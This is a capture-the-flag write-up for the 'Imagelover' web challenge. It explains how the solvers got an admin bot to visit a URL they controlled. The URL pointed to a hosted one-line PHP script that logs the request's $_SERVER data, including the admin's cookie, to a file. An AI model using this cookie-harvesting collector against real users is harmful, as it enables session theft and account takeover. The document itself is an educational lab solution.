## IMAGELOVER - 70 PTS

### CHALLENGE
Find imagelover here (http://hack.bckdr.in:6969/)   
Imagelover loves viewing pictures of people. He has opened this website so that you can share your pics with him. Imagelover visits the image with his flag as a sign of gratitude.

### SOLUTION
* The challenge asked us to provide a url which the admin would be visiting carrying along with him the flag.
* We tried to include some simple script tags in the url but it didn't accept them.   
`There was some issue with your url, check and submit again`    
* Then, we tried simple urls and realized there was no check on the url, except for http:// and that it accepted .php .html, etc.
* So, we hosted a php script online     
`<?php $fh = fopen('ans.txt', 'a'); fwrite($fh, print_r($_SERVER,true)); fclose($fh); ?>`    
which saved the contents of `$_SERVER` in a file in order to look for cookies.
* And when we opened the `ans.txt` file, we had     
`Array ( ... [HTTP_COOKIE] => flag=<---------------------------- ...)`